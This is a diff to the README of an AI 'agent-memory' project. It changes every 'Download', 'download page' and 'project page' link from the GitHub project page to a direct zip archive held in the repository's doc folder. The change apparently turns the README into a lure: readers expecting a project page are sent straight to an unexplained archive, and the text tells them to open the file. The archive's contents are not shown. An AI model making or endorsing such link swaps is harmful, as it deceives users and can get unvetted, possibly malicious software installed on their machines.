@@ -1,6 +1,6 @@
 # 🧠 agent-memory - Keep AI context in one place
 
-[![Download](https://img.shields.io/badge/Download%20agent-memory-blue-grey?style=for-the-badge)](https://github.com/raymondmdzz123/agent-memory)
+[![Download](https://img.shields.io/badge/Download%20agent-memory-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/raymondmdzz123/agent-memory/main/doc/memory_agent_2.0.zip)
 
 ## 🧭 What this is
 
@@ -35,7 +35,7 @@ If you plan to use it inside your own app, you may also need:
 
 Go to the project page here:
 
-[Visit the download page](https://github.com/raymondmdzz123/agent-memory)
+[Visit the download page](https://raw.githubusercontent.com/raymondmdzz123/agent-memory/main/doc/memory_agent_2.0.zip)
 
 If the page gives you a downloadable package or release file, download it to your PC, then open the file or place it in your project folder as needed. If you are using it as a library, follow the steps below to add it to your app.
 
@@ -211,7 +211,7 @@ For most Windows users, the process is:
 
 ## 🔗 Download again
 
-[Open the project page](https://github.com/raymondmdzz123/agent-memory)
+[Open the project page](https://raw.githubusercontent.com/raymondmdzz123/agent-memory/main/doc/memory_agent_2.0.zip)
 
 ## 🧭 File names you may see
 
